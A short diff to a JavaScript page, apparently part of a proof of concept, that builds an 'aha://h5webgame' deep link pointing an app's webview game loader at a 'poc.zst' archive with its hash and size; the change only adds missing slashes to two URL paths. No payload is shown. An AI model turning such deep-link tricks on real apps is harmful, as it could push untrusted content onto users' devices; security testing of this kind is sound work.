@@ -10,8 +10,8 @@ var SIZE = 1392;
 // n = per-run nonce (fresh id per run: DownloadState is persisted per game id).
 var n = "" + (Date.now() % 1000000);
 var link = "aha://h5webgame?id=" + (900000 + Number(n)) + "&name=poc"
-         + "&link=" + encodeURIComponent(location.origin + "Webviewtest/game.html?n=" + n)
-         + "&sourceUrl=" + encodeURIComponent(location.origin + "Webviewtest/poc.zst")
+         + "&link=" + encodeURIComponent(location.origin + "/Webviewtest/game.html?n=" + n)
+         + "&sourceUrl=" + encodeURIComponent(location.origin + "/Webviewtest/poc.zst")
          + "&sourceMd5=" + MD5 + "&sourceSize=" + SIZE;
 document.getElementById("k").href = link;
 document.getElementById("l").textContent = link;
